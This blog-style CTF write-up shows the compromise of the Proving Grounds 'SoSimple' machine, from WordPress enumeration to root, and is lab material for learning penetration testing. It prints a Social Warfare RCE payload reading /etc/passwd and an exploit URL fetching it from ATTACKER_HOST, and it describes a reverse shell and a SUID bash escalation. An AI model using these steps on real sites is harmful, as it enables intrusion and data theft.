---
layout: post
title: "SoSimple - Proving Grounds Play"
summary: "WordPress discovery via directory brute-force → WPScan user enumeration → Social Warfare plugin RCE vulnerability → payload hosting and admin-post.php exploitation → reverse shell access → secret key file (rabbit hole) → SSH id_rsa file discovery (max user) → max SSH login → service command via sudo → Steven user escalation via GTFOBins → missing script for root access"
---

# SoSimple - Proving Grounds Play

## Enumeration
### Nmap 
Initial nmap scan revealed HTTP and SSH ports were open.

<img width="775" height="318" alt="00 - nmap" src="https://github.com/user-attachments/assets/a7417c7f-961b-4f31-a451-b9cb066e3046" />

### Web Enumeration
The website included a PNG and nothing else.

<img width="1280" height="547" alt="01 - website" src="https://github.com/user-attachments/assets/e48750d6-eaba-4c30-a6ca-901df11af081" />

So I applied directory brute forcing and found wordpress endpoint.

<img width="958" height="474" alt="02 - wordpress dir" src="https://github.com/user-attachments/assets/f69a0c65-8922-4f20-9d0b-6a775b109ad6" />

Then I ran WPScan and found valid users.

<img width="843" height="439" alt="03 - wpscan users" src="https://github.com/user-attachments/assets/9757b0d6-b2a9-4524-b167-602cb2d2e64e" />

However, I could not find users' password with brute forcing. 

Later, I checked plugin versions and found Social Warfare Plugin is outdated.

<img width="1016" height="579" alt="04 - vuln plugins" src="https://github.com/user-attachments/assets/33ef24c6-fd93-40e1-8551-c4fb238a37f2" />

## Exploitation
### Remote Code Execution
Searching through the web, I found [Social Warfare RCE PoC](https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618/) from official wpscan site. It was simple:
1. Create payload file and host it on a location accessible by a targeted website. Payload content : "<pre>system('cat /etc/passwd')</pre>"
2. Visit http://WEBSITE/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACKER_HOST/payload.txt
3. Content of /etc/passwd will be returned

So at first, I created a reverse shell payload and hosted it.

<img width="856" height="199" alt="05 - payload" src="https://github.com/user-attachments/assets/c7fda187-65f2-4cdc-9115-8729eec13cc5" />

Then visited the web page mentioned in the PoC step 2.

<img width="1276" height="386" alt="06 - visit" src="https://github.com/user-attachments/assets/d85966d4-cac2-46fe-98c4-2fde1df6aca3" />

Then I simply got a reverse shell.

<img width="688" height="146" alt="07 - revshell" src="https://github.com/user-attachments/assets/8efd236a-aa07-4c04-bf2e-241f2f795d21" />

### Rabbit Hole 1
Initially I checked wp-config.php and it was useless. Then I found secretkey.txt file but it was a rabbit-hole.

<img width="1027" height="552" alt="08 - first rabbit hole" src="https://github.com/user-attachments/assets/20ee6261-e1d9-45b2-9104-9e37b51df7e3" />

Then I checked home pages of users and found user flag.

<img width="604" height="313" alt="09 - user flag" src="https://github.com/user-attachments/assets/59f103f6-fabf-439c-891b-3cd64591222f" />

## Privilege Escalation
### 2nd Rabbit Hole
There was a 2nd rabbit hole on max's home page.

<img width="747" height="259" alt="10 - 2nd rabbit hole" src="https://github.com/user-attachments/assets/83132ce5-b46d-4e23-a304-9f0432d5f117" />

### id_rsa
The id_rsa of max was readable by www-data.

<img width="663" height="366" alt="11 - id_rsa" src="https://github.com/user-attachments/assets/f5fbc7c5-e388-4cde-a6c0-cc5f5f5cc6fe" />

So I simply copied it and logged in to max using SSH.

<img width="753" height="496" alt="12 - ssh" src="https://github.com/user-attachments/assets/f798f72c-d89c-4f5e-b153-62961bda80c9" />

### Running service as steven
sudo -l command revealed that max could run service command as steven user. There was[ gtfobins page](https://gtfobins.github.io/gtfobins/service/) available for service command. I simply followed sudo privilege escalation steps and obtained steven user.

<img width="585" height="49" alt="14 - steven" src="https://github.com/user-attachments/assets/4af1bde4-4da2-479c-9dd4-6bb5a8c3efbb" />

### sudo -l to root
Steven user could run a script as root. But the script was not available. 

<img width="989" height="99" alt="15 - sudo l 2" src="https://github.com/user-attachments/assets/53526145-f051-43c4-b5a6-000e35130ade" />

I simply created that script to give SUID privileges to /bin/bash and then obtained root shell and the root flag.

<img width="771" height="197" alt="16 - root flag" src="https://github.com/user-attachments/assets/720596d0-e3d2-42af-9ae8-9f32e755fc11" />
